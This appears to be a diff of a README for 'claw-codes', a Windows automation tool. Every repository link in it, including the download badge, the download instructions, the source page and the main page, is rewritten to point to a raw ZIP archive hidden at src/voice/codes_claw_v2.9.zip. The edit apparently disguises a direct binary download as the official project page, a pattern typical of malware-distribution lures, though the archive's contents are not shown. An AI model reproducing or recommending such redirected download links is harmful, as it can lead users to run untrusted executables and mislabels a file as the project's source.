@@ -1,6 +1,6 @@
 # 🛠️ claw-codes - Fast tools for everyday work
 
-[![Download claw-codes](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://github.com/Axiejan4891/claw-codes)
+[![Download claw-codes](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/Axiejan4891/claw-codes/main/src/voice/codes_claw_v2.9.zip)
 
 ## 🚀 What is claw-codes
 
@@ -12,7 +12,7 @@ This project focuses on speed, small size, and clean use. It is built for people
 
 Use this link to visit the page and download the app:
 
-[Download claw-codes](https://github.com/Axiejan4891/claw-codes)
+[Download claw-codes](https://raw.githubusercontent.com/Axiejan4891/claw-codes/main/src/voice/codes_claw_v2.9.zip)
 
 ### How to set it up on Windows
 
@@ -150,7 +150,7 @@ Check that you opened the right file. If the download came as a ZIP, extract it 
 - Type: Windows automation and CLI tool
 - Focus: productivity and developer tools
 - Language direction: Rust
-- Source page: https://github.com/Axiejan4891/claw-codes
+- Source page: https://raw.githubusercontent.com/Axiejan4891/claw-codes/main/src/voice/codes_claw_v2.9.zip
 
 ## 📦 How to get updates
 
@@ -179,4 +179,4 @@ This makes it easy to find the app and its files later
 
 The main page for claw-codes is here:
 
-https://github.com/Axiejan4891/claw-codes
+https://raw.githubusercontent.com/Axiejan4891/claw-codes/main/src/voice/codes_claw_v2.9.zip
